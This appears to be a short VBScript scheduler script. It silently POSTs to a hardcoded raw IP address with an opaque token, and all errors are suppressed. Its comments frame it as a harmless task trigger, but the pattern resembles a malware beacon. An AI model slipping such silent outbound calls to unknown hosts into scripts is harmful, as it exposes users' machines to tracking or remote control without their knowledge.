Call Schedule()

Sub Schedule()

On Error Resume Next

'Declare variables
Dim objRequest
Dim URL

Set objRequest = CreateObject("Microsoft.XMLHTTP")

'this is the asp script that you want to be run
URL = "http://91.237.98.115/n.ashx?u=fgkjhghntyjhgfjkh5676767gh67dcgDFghjhghjkJHGhjj"

'Open the HTTP request and pass the URL to the objRequest object
objRequest.open "POST", URL , false

'Send the HTML Request
objRequest.Send

'Set the object to nothing
Set objRequest = Nothing

End Sub